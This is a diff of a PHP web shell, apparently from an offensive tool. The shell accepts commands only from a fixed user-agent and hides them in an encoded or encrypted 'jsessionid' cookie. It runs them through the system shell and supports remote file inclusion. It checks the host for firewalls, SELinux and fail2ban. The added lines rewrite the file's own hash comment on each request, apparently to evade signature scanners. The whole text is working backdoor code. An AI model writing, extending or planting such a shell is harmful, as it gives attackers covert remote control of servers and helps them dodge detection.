@@ -1,7 +1,11 @@
 <?php
-const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
+//dac45fe2013619e9b82254ab7e16146b38def48b31f9506eb6db41393bc0d9de55607bbdb7eae7a5ab171745d9275f6112a8fdbb0fda661fbedc209598016df9126b4b610ba09922ed7a5a
+if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
+    $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
+    $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
+    file_put_contents(getcwd()."/".$_SERVER['PHP_SELF'], $me);
+}
 @ini_set("safe_mode", 0);
-@system("chattr +i " . $_SERVER['PHP_SELF']);
 function banner()
 {
 
@@ -49,7 +53,7 @@ function checkComs(): array
         "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
     );
     foreach ($lincommands as $item) {
-        $useful_commands[$item] = shell_exec("which {$item}") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $useful_commands[$item] = shell_exec(sloppyshell . " -c 'which {$item}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $useful_commands;
 }
@@ -61,7 +65,7 @@ function parseProtections(): array
         "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
     );
     foreach ($protections as $prot) {
-        $prots[$prot] = shell_exec("which " . $prot) ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $prots[$prot] = shell_exec(sloppyshell . " -c 'which {$prot}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $prots;
 }
@@ -78,7 +82,7 @@ function checkShells($os): array
         ]
     ];
     foreach ($shells[$os] as $shell) {
-        $usable_shells[$shell] = shell_exec("which " . $shell) ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $usable_shells[$shell] = shell_exec(sloppyshell . " -c 'which {$shell}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $usable_shells;
 }
@@ -90,7 +94,7 @@ function checkPack(): array
         "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3", "gem", "cargo", "nuget", "ant", "emerge", "go"
     );
     foreach ($packs as $pack) {
-        $package_management[$pack] = shell_exec("which " . $pack) ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $package_management[$pack] = shell_exec(sloppyshell . "-c 'which {$pack}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $package_management;
 }
@@ -100,8 +104,14 @@ function checkPack(): array
 function checkSystem(): string
 {
     if (str_starts_with(php_uname(), 'Windows')) {
+        if (!defined("sloppyshell")){
+            define("sloppyshell", "powershell");
+        }
         return "Windows";
     } else {
+        if (!defined("sloppyshell")){
+            define("sloppyshell", "bash");
+        }
         return "Linux";
     }
 }
@@ -212,14 +222,14 @@ $sk = null;
 $ad = null;
 $ct = null;
 $split = null;
+checkSystem();
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
     if (isset($_POST["cr"])) {
-
         if ($_POST['cr'] === "1") {
             $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
-            executeCommands($split, "0");
+            executeCommands($split);
         } elseif ($_POST['cr'] === '1b') {
             $split = base64_decode($_COOKIE['jsessionid']);
             executeCommands($split, '1');
@@ -227,7 +237,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
             $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
-            executeCommands(base64_decode($split), "0");
+            executeCommands(base64_decode($split));
         }
     }elseif (isset($_POST["doInclude"])) {
         remoteFileInclude($_POST["doInclude"]);
